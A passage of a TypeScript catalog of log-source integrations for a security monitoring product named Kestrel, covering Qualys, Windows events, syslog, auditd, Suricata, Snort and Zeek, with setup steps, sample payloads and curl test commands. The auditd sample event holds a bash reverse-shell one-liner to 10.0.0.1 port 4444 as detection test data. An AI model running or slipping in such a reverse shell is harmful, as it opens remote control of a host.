          'The Qualys API URL is region-specific. Find yours at:\n' +
          'qualys.com/platform-identification/ or in your subscription welcome email.\n' +
          'US: `qualysapi.qualys.com`\n' +
          'EU: `qualysapi.qualys.eu`',
      },
      {
        title: 'Set Kestrel environment variables',
        body:
          'Add `QUALYS_API_URL`, `QUALYS_USERNAME`, and `QUALYS_PASSWORD` to your Kestrel `.env` file.',
      },
      {
        title: 'Test the API',
        body:
          'Run the test command. A successful XML response listing your subscriptions confirms API access.',
      },
    ],
    envKeys: [
      { key: 'QUALYS_API_URL', label: 'Qualys API URL', sensitive: false, hint: 'Region-specific API URL e.g. qualysapi.qualys.com' },
      { key: 'QUALYS_USERNAME', label: 'Qualys Username', sensitive: false, hint: 'Your Qualys portal username' },
      { key: 'QUALYS_PASSWORD', label: 'Qualys Password', sensitive: true, hint: 'Your Qualys portal password' },
    ],
    testCommand:
      'curl -s -u "$QUALYS_USERNAME:$QUALYS_PASSWORD" \\\n' +
      '  -H "X-Requested-With: KestrelSOC" \\\n' +
      '  "https://$QUALYS_API_URL/api/2.0/fo/subscription/?action=list" | python3 -c "import sys,xmltodict,json; print(json.dumps(xmltodict.parse(sys.stdin.read()),indent=2)[:500])"',
    helpTags: ['qualys', 'vmdr', 'vulnerability', 'cve', 'scanning', 'asset risk', 'compliance', 'patch'],
  },

  // ── 24. Windows Event Log ──────────────────────────────────────────────────
  {
    id: 'windows',
    name: 'Windows Event Log',
    vendor: 'Microsoft',
    type: 'OS',
    push: true,
    description: 'Windows Security and System event forwarding via Winlogbeat or NXLog.',
    logoColor: '#0078d4',
    logoBg: '#e6f2fb',
    overview:
      'Windows Event Log captures security-critical events including logon/logoff (EventID 4624/4625), ' +
      'privilege use, process creation (EventID 4688), and PowerShell execution. ' +
      'Kestrel receives Windows events via the push ingest API using Winlogbeat, NXLog, or a custom forwarder, ' +
      'and maps common Event IDs to MITRE ATT&CK techniques automatically.',
    prerequisites: [
      'Windows host with Security Auditing policy configured (Local Group Policy or GPO)',
      'Winlogbeat 8.x (recommended) or NXLog Community Edition installed on the source host',
      'Network connectivity from the Windows host to the Kestrel ingest endpoint on port 443',
      'Kestrel API token generated from Settings → API Tokens',
    ],
    setupSteps: [
      {
        title: 'Configure Windows Audit Policy',
        body:
          'Enable Security Auditing via Group Policy or Local Security Policy:\n' +
          '`auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable`\n' +
          '`auditpol /set /category:"Object Access" /success:enable /failure:enable`\n' +
          '`auditpol /set /subcategory:"Process Creation" /success:enable`\n' +
          'For PowerShell logging also enable Script Block Logging via GPO.',
      },
      {
        title: 'Install and configure Winlogbeat',
        body:
          'Download Winlogbeat from elastic.co/beats/winlogbeat. ' +
          'Edit `winlogbeat.yml`:\n' +
          '```\nwinlogbeat.event_logs:\n  - name: Security\n  - name: System\n  - name: Application\n\n' +
          'output.http:\n  hosts: ["https://your-kestrel-host/api/v1/ingest"]\n' +
          '  headers:\n    Authorization: "Bearer YOUR_KESTREL_API_TOKEN"\n    Content-Type: "application/json"\n```',
      },
      {
        title: 'Start Winlogbeat as a service',
        body:
          'Run as Administrator:\n' +
          '`winlogbeat.exe install-service`\n' +
          '`Start-Service winlogbeat`\n' +
          'Or test in the foreground:\n' +
          '`winlogbeat.exe -c winlogbeat.yml -e`',
      },
      {
        title: 'Verify events are being received',
        body:
          'In the Kestrel dashboard the Windows Event Log source card should update to Active status ' +
          'within a few minutes of the first event being forwarded.',
      },
    ],
    envKeys: [],
    examplePayload: JSON.stringify({
      source: 'windows',
      events: [
        {
          EventID: 4625,
          TimeCreated: '2025-03-08T10:00:00Z',
          ComputerName: 'WORKSTATION-01',
          TargetUserName: 'administrator',
          IpAddress: '192.168.1.105',
          LogonType: 3,
          SubStatus: '0xC000006A',
          Channel: 'Security',
        },
      ],
    }, null, 2),
    testCommand:
      '# PowerShell — send a test event to Kestrel\n' +
      '$token = "YOUR_KESTREL_API_TOKEN"\n' +
      '$body = \'{"source":"windows","events":[{"EventID":4625,"TimeCreated":"2025-01-01T00:00:00Z","ComputerName":"TEST-HOST","TargetUserName":"admin","IpAddress":"10.0.0.1","LogonType":3}]}\'\n' +
      'Invoke-RestMethod -Uri "https://your-kestrel-host/api/v1/ingest" -Method POST -Headers @{Authorization="Bearer $token";"Content-Type"="application/json"} -Body $body',
    helpTags: ['windows', 'event log', 'winlogbeat', 'nxlog', 'sysmon', 'eventid', 'security auditing', 'push'],
  },

  // ── 25. Syslog Push ───────────────────────────────────────────────────────
  {
    id: 'syslog',
    name: 'Syslog Push',
    vendor: 'Generic',
    type: 'OS',
    push: true,
    description: 'Generic syslog forwarding to the Kestrel ingest endpoint.',
    logoColor: '#6b7280',
    logoBg: '#f3f4f6',
    overview:
      'Syslog is the universal logging protocol supported by virtually every Linux/Unix system, network device, ' +
      'and application. ' +
      'Kestrel accepts syslog-formatted messages forwarded via Filebeat, rsyslog, syslog-ng, or any HTTP-capable ' +
      'syslog forwarder, parsing facility, severity, and message content into structured alerts.',
    prerequisites: [
      'Source system generating syslog messages (Linux, network device, application)',
      'Filebeat, rsyslog, or syslog-ng installed on the syslog collector/relay',
      'Network connectivity to the Kestrel ingest endpoint on port 443',
      'Kestrel API token',
    ],
    setupSteps: [
      {
        title: 'Configure rsyslog to forward to Kestrel',
        body:
          'Edit `/etc/rsyslog.conf` or add `/etc/rsyslog.d/kestrel.conf`:\n' +
          '```\nmodule(load="omhttp")\naction(type="omhttp" server="your-kestrel-host" serverport="443"\n' +
          '  restpath="/api/v1/ingest" usehttps="on"\n  httpheaders.1="Authorization: Bearer YOUR_TOKEN"\n  template="RSYSLOG_JSON")\n```',
      },
      {
        title: 'Configure Filebeat with HTTP output',
        body:
          'Edit `filebeat.yml`:\n' +
          '```\nfilebeat.inputs:\n  - type: log\n    paths: ["/var/log/*.log", "/var/log/syslog"]\n\n' +
          'output.http:\n  hosts: ["https://your-kestrel-host/api/v1/ingest"]\n' +
          '  headers:\n    Authorization: "Bearer YOUR_KESTREL_API_TOKEN"\n```',
      },
      {
        title: 'Test the ingest endpoint manually',
        body:
          'Send a test syslog event using the curl command below. ' +
          'Kestrel will parse the message, assign severity, and create an alert if the content matches a detection rule.',
      },
      {
        title: 'Verify in the Kestrel UI',
        body:
          'The Syslog source card on the Sources page should change to Active within 60 seconds of the first received event.',
      },
    ],
    envKeys: [],
    examplePayload: JSON.stringify({
      source: 'syslog',
      events: [
        {
          facility: 4,
          severity: 3,
          timestamp: '2025-03-08T10:00:00Z',
          hostname: 'webserver-01',
          appname: 'sshd',
          message: 'Failed password for invalid user admin from 203.0.113.42 port 54321 ssh2',
        },
      ],
    }, null, 2),
    testCommand:
      'curl -s -X POST https://your-kestrel-host/api/v1/ingest \\\n' +
      '  -H "Authorization: Bearer YOUR_KESTREL_API_TOKEN" \\\n' +
      '  -H "Content-Type: application/json" \\\n' +
      '  -d \'{"source":"syslog","events":[{"facility":4,"severity":3,"timestamp":"2025-01-01T00:00:00Z","hostname":"test-host","message":"Failed password for root from 10.0.0.1 port 22 ssh2"}]}\' | jq .',
    helpTags: ['syslog', 'rsyslog', 'syslog-ng', 'filebeat', 'log forwarding', 'linux', 'push', 'generic'],
  },

  // ── 26. Linux Auditd ──────────────────────────────────────────────────────
  {
    id: 'linux-auditd',
    name: 'Linux Auditd',
    vendor: 'Linux',
    type: 'OS',
    push: true,
    description: 'Linux kernel audit subsystem — syscall, file, and process events.',
    logoColor: '#f97316',
    logoBg: '#fff4ed',
    overview:
      'The Linux Audit Daemon (auditd) provides a kernel-level audit trail for system calls, file access, ' +
      'process execution, and authentication events. ' +
      'Kestrel receives auditd events forwarded via Auditbeat or Filebeat with the auditd module, ' +
      'detecting privilege escalation, suspicious process execution, and file integrity violations ' +
      'with automatic MITRE ATT&CK mapping.',
    prerequisites: [
      'Linux system with auditd installed and running (`apt install auditd` or `yum install audit`)',
      'Auditbeat 8.x (recommended) or Filebeat with auditd module enabled',
      'Audit rules configured for the events you want to capture',
      'Network connectivity to the Kestrel ingest endpoint',
      'Kestrel API token',
    ],
    setupSteps: [
      {
        title: 'Install and configure auditd rules',
        body:
          'Install auditd:\n' +
          '`apt install auditd audispd-plugins` (Debian/Ubuntu)\n' +
          '`yum install audit audit-libs` (RHEL/CentOS)\n\n' +
          'Add recommended rules to `/etc/audit/rules.d/kestrel.rules`:\n' +
          '`-a always,exit -F arch=b64 -S execve -k exec`\n' +
          '`-w /etc/passwd -p wa -k identity`\n' +
          '`-w /etc/sudoers -p wa -k sudoers`\n' +
          '`auditctl -R /etc/audit/rules.d/kestrel.rules`',
      },
      {
        title: 'Install and configure Auditbeat',
        body:
          'Download Auditbeat from elastic.co. Edit `auditbeat.yml`:\n' +
          '```\nauditbeat.modules:\n  - module: auditd\n    audit_rules: |\n' +
          '      -a always,exit -F arch=b64 -S execve -k exec\n      -w /etc/passwd -p wa -k identity\n\n' +
          'output.http:\n  hosts: ["https://your-kestrel-host/api/v1/ingest"]\n' +
          '  headers:\n    Authorization: "Bearer YOUR_KESTREL_API_TOKEN"\n```',
      },
      {
        title: 'Start Auditbeat',
        body:
          '`systemctl enable auditbeat && systemctl start auditbeat`\n' +
          'Check status: `systemctl status auditbeat`\n' +
          'View logs: `journalctl -u auditbeat -f`',
      },
      {
        title: 'Verify events are received',
        body:
          'Trigger a test event (e.g. `sudo cat /etc/sudoers`) and confirm a corresponding alert appears ' +
          'in the Kestrel Alerts page within a few seconds.',
      },
    ],
    envKeys: [],
    examplePayload: JSON.stringify({
      source: 'linux-auditd',
      events: [
        {
          timestamp: '2025-03-08T10:00:00.000Z',
          event_type: 'SYSCALL',
          syscall: 'execve',
          pid: 12345,
          ppid: 1234,
          uid: 0,
          user: 'root',
          exe: '/bin/bash',
          command: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
          hostname: 'linux-server-01',
          key: 'exec',
        },
      ],
    }, null, 2),
    testCommand:
      'curl -s -X POST https://your-kestrel-host/api/v1/ingest \\\n' +
      '  -H "Authorization: Bearer YOUR_KESTREL_API_TOKEN" \\\n' +
      '  -H "Content-Type: application/json" \\\n' +
      '  -d \'{"source":"linux-auditd","events":[{"timestamp":"2025-01-01T00:00:00Z","event_type":"SYSCALL","syscall":"execve","uid":0,"user":"root","exe":"/bin/bash","hostname":"test-host"}]}\' | jq .',
    helpTags: ['linux', 'auditd', 'audit', 'syscall', 'auditbeat', 'process', 'file integrity', 'push'],
  },

  // ── 27. Suricata IDS ─────────────────────────────────────────────────────
  {
    id: 'suricata',
    name: 'Suricata IDS',
    vendor: 'OISF',
    type: 'IDS/IPS',
    push: true,
    description: 'High-performance open-source IDS/IPS EVE JSON log forwarding.',
    logoColor: '#e97624',
    logoBg: '#fef3ec',
    overview:
      'Suricata is a high-performance, open-source network intrusion detection and prevention system developed by ' +
      'the Open Information Security Foundation (OISF). ' +
      'Kestrel receives Suricata EVE JSON output forwarded by Filebeat or directly via HTTP, ' +
      'processing alert, dns, http, tls, and flow event types and mapping Suricata rule SIDs to MITRE ATT&CK techniques.',
    prerequisites: [
      'Suricata 6.0 or later installed and monitoring a network interface',
      'EVE JSON output enabled in suricata.yaml',
      'Filebeat installed on the Suricata host, or rsyslog with HTTP output module',
      'Suricata rules updated (suricata-update recommended)',
      'Network connectivity from the Suricata host to the Kestrel ingest endpoint',
    ],
    setupSteps: [
      {
        title: 'Enable EVE JSON output in Suricata',
        body:
          'Edit `/etc/suricata/suricata.yaml`:\n' +
          '```yaml\noutputs:\n  - eve-log:\n      enabled: yes\n      filetype: regular\n' +
          '      filename: /var/log/suricata/eve.json\n      types:\n        - alert\n        - dns\n        - http\n        - tls\n```\n' +
          'Restart Suricata: `systemctl restart suricata`',
      },
      {
        title: 'Configure Filebeat to forward EVE JSON',
        body:
          'Edit `filebeat.yml`:\n' +
          '```yaml\nfilebeat.inputs:\n  - type: log\n    paths:\n      - /var/log/suricata/eve.json\n' +
          '    json.keys_under_root: true\n    json.add_error_key: true\n\n' +
          'output.http:\n  hosts: ["https://your-kestrel-host/api/v1/ingest"]\n' +
          '  headers:\n    Authorization: "Bearer YOUR_KESTREL_API_TOKEN"\n    Content-Type: "application/json"\n```',
      },
      {
        title: 'Update Suricata rules',
        body:
          'Run `suricata-update` to download the latest ET Open rules:\n' +
          '`suricata-update && systemctl reload suricata`\n' +
          'Consider adding ET Pro or Proofpoint rules for broader coverage.',
      },
      {
        title: 'Test with a sample alert',
        body:
          'Trigger a test alert using the curl command below, or generate traffic matching a known rule ' +
          '(e.g. `curl http://testmynids.us/uid/index.html`) and confirm it appears in Kestrel Alerts.',
      },
    ],
    envKeys: [],
    examplePayload: JSON.stringify({
      source: 'suricata',
      events: [
        {
          timestamp: '2025-03-08T10:00:00.000000+0000',
          event_type: 'alert',
          src_ip: '192.168.1.105',
          src_port: 54321,
          dest_ip: '203.0.113.42',
          dest_port: 443,
          proto: 'TCP',
          alert: {
            action: 'allowed',
            gid: 1,
            signature_id: 2027865,
            rev: 1,
            signature: 'ET MALWARE Cobalt Strike Beacon Activity',
            category: 'A Network Trojan was detected',
            severity: 1,
          },
          flow_id: 987654321,
          in_iface: 'eth0',
        },
      ],
    }, null, 2),
    testCommand:
      'curl -s -X POST https://your-kestrel-host/api/v1/ingest \\\n' +
      '  -H "Authorization: Bearer YOUR_KESTREL_API_TOKEN" \\\n' +
      '  -H "Content-Type: application/json" \\\n' +
      '  -d \'{"source":"suricata","events":[{"timestamp":"2025-01-01T00:00:00Z","event_type":"alert","src_ip":"10.0.0.1","dest_ip":"192.168.1.1","alert":{"signature":"ET TEST Rule","severity":2,"category":"test"}}]}\' | jq .',
    helpTags: ['suricata', 'ids', 'ips', 'eve json', 'network', 'intrusion detection', 'filebeat', 'push'],
  },

  // ── 28. Snort ─────────────────────────────────────────────────────────────
  {
    id: 'snort',
    name: 'Snort',
    vendor: 'Cisco',
    type: 'IDS/IPS',
    push: true,
    description: 'Classic open-source IDS/IPS — alert forwarding via barnyard2 or syslog.',
    logoColor: '#c11b1b',
    logoBg: '#fceaea',
    overview:
      'Snort is the original open-source network intrusion detection system, now maintained by Cisco. ' +
      'Kestrel accepts Snort alert data forwarded via barnyard2 (unified2 format), syslog, or JSON output from Snort 3, ' +
      'parsing rule signatures, source/destination IPs, and classifying alerts against MITRE ATT&CK.',
    prerequisites: [
      'Snort 2.9.x or Snort 3.x installed and monitoring a network interface',
      'barnyard2 installed (for Snort 2 unified2 output) OR Snort 3 with JSON/syslog output',
      'Snort Registered or Subscriber rule set (snort.org)',
      'Network connectivity from the Snort host to the Kestrel ingest endpoint',
    ],
    setupSteps: [
      {
        title: 'Configure Snort 3 JSON alert output',
        body:
          'In `snort.lua` add an alert_json output:\n' +
          '`alert_json = { file = true, limit = 100 }`\n' +
          'Or for syslog output:\n' +
          '`alert_syslog = { level = "LOG_ALERT", facility = "LOG_LOCAL0" }`',
      },
      {
        title: 'Configure barnyard2 for Snort 2 (legacy)',
        body:
          'Edit `barnyard2.conf`:\n' +
          '`output alert_json: filename /var/log/snort/alert.json`\n' +
          'Run barnyard2:\n' +
          '`barnyard2 -c /etc/snort/barnyard2.conf -d /var/log/snort -f snort.u2`',
      },
      {
        title: 'Configure Filebeat to forward Snort alerts',
        body:
          'Add a Filebeat input for the Snort alert JSON file and forward to the Kestrel ingest endpoint ' +
          '(same configuration as Suricata — see step 2 of the Suricata guide).',
      },
      {
        title: 'Test the integration',
        body:
          'Send a test alert using the curl command below and confirm it appears in Kestrel. ' +
          'Or trigger a real detection by sending traffic matching a Snort community rule.',
      },
    ],
    envKeys: [],
    examplePayload: JSON.stringify({
      source: 'snort',
      events: [
        {
          timestamp: '2025-03-08T10:00:00Z',
          message: 'PROTOCOL-ICMP PING',
          signature_id: 384,
          revision: 6,
          priority: 3,
          classification: 'Misc activity',
          src_ip: '10.0.0.5',
          src_port: null,
          dst_ip: '192.168.1.1',
          dst_port: null,
          protocol: 'ICMP',
          sensor: 'snort-sensor-01',
        },
      ],
    }, null, 2),
    testCommand:
      'curl -s -X POST https://your-kestrel-host/api/v1/ingest \\\n' +
      '  -H "Authorization: Bearer YOUR_KESTREL_API_TOKEN" \\\n' +
      '  -H "Content-Type: application/json" \\\n' +
      '  -d \'{"source":"snort","events":[{"timestamp":"2025-01-01T00:00:00Z","message":"SQL Injection attempt","signature_id":1000001,"priority":1,"src_ip":"10.0.0.5","dst_ip":"192.168.1.100"}]}\' | jq .',
    helpTags: ['snort', 'cisco', 'ids', 'ips', 'barnyard2', 'unified2', 'network', 'push'],
  },

  // ── 29. Zeek/Bro ─────────────────────────────────────────────────────────
  {
    id: 'zeek',
    name: 'Zeek (Bro)',
    vendor: 'Zeek Project',
    type: 'IDS/IPS',
    push: true,
    description: 'Network traffic analysis framework — conn, dns, http, ssl log forwarding.',
    logoColor: '#2563eb',
    logoBg: '#eff3ff',
    overview:
      'Zeek (formerly Bro) is a powerful open-source network analysis framework that generates rich, ' +
      'structured logs for all observed network traffic — including conn.log, dns.log, http.log, ssl.log, and notice.log. ' +
      'Kestrel ingests Zeek logs forwarded via Filebeat to detect network anomalies, C2 communication patterns, ' +
      'DNS tunnelling, and suspicious TLS certificate usage.',
    prerequisites: [
      'Zeek 4.0 or later deployed on a network tap or span port',
      'Zeek JSON log output enabled (LogAscii::use_json=T)',
      'Filebeat installed on the Zeek host for log forwarding',
      'Zeek scripts configured for the traffic types you want to log',
      'Network connectivity to the Kestrel ingest endpoint',
    ],
    setupSteps: [
      {
        title: 'Enable Zeek JSON output',
        body:
          'Add to `/etc/zeek/local.zeek`:\n' +
          '`@load tuning/json-logs`\n' +
          'Or add to `zeekctl.cfg`:\n' +
          '`LogAscii::use_json=T`\n' +
          'Redeploy: `zeekctl deploy`',
      },
      {
        title: 'Configure Filebeat to ship Zeek logs',
        body:
          'Edit `filebeat.yml`:\n' +
          '```yaml\nfilebeat.inputs:\n  - type: log\n    paths:\n      - /opt/zeek/logs/current/conn.log\n' +
          '      - /opt/zeek/logs/current/dns.log\n      - /opt/zeek/logs/current/http.log\n' +
          '      - /opt/zeek/logs/current/notice.log\n    json.keys_under_root: true\n\n' +
          'output.http:\n  hosts: ["https://your-kestrel-host/api/v1/ingest"]\n' +
          '  headers:\n    Authorization: "Bearer YOUR_KESTREL_API_TOKEN"\n```',
      },
      {
        title: 'Add Zeek detection scripts',
        body:
          'Install community Zeek packages for enhanced detection:\n' +
          '`zkg install zeek/sethhall/ja3`  # JA3 TLS fingerprinting\n' +
          '`zkg install zeek/corelight/bro-long-connections`  # Detect C2 beaconing\n' +
          'Redeploy after adding packages.',
      },
      {
        title: 'Verify log forwarding',
        body:
          'Run `zeekctl status` to confirm Zeek is running. ' +
          'Check `systemctl status filebeat` for forwarding status. ' +
          'Send a test event using the curl command below to validate the ingest endpoint.',
      },
    ],
    envKeys: [],
    examplePayload: JSON.stringify({
      source: 'zeek',
      events: [
        {
          ts: 1741430400.0,
          uid: 'CUfm0J3OtSrXLzQjp3',
          id_orig_h: '192.168.1.105',
          id_orig_p: 49321,
          id_resp_h: '203.0.113.42',
          id_resp_p: 443,
          proto: 'tcp',
          service: 'ssl',
          duration: 3600.5,
          orig_bytes: 2048,
          resp_bytes: 512000,
          conn_state: 'SF',
          local_orig: true,
          local_resp: false,
          log_type: 'conn',
        },
      ],
    }, null, 2),
    testCommand:
      'curl -s -X POST https://your-kestrel-host/api/v1/ingest \\\n' +
      '  -H "Authorization: Bearer YOUR_KESTREL_API_TOKEN" \\\n' +
      '  -H "Content-Type: application/json" \\\n' +
      '  -d \'{"source":"zeek","events":[{"ts":1700000000.0,"uid":"CTest123","id_orig_h":"10.0.0.1","id_resp_h":"8.8.8.8","id_resp_p":53,"proto":"udp","log_type":"dns","query":"malicious-domain.ru"}]}\' | jq .',
    helpTags: ['zeek', 'bro', 'network analysis', 'ids', 'conn log', 'dns', 'ssl', 'push'],
  },
]

// ─────────────────────────────────────────────────────────────────────────────
// Lookup map: SOURCE_MAP['sentinel'] → SourceEntry
// ─────────────────────────────────────────────────────────────────────────────

export const SOURCE_MAP: Record<string, SourceEntry> = Object.fromEntries(
  SOURCE_CATALOG.map((s) => [s.id, s])
)
